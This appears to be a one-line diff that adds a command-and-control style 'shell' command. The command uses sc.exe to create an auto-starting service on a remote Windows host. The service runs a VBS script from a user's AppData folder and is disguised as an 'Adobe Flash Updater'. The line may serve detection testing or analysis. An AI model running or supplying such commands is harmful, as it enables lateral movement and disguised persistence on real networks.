@@ -1,0 +1,1 @@
+shell C:\WINDOWS\system32\sc.exe `\`\HFDC01 create AdobeUpdater binPath= "cmd.exe /c `\`"C:\Users\pgustavo\AppData\Roaming\Adobe\Flash Player\autoupdate.vbs`\`" " DisplayName= "Adobe Flash Updater" start= auto
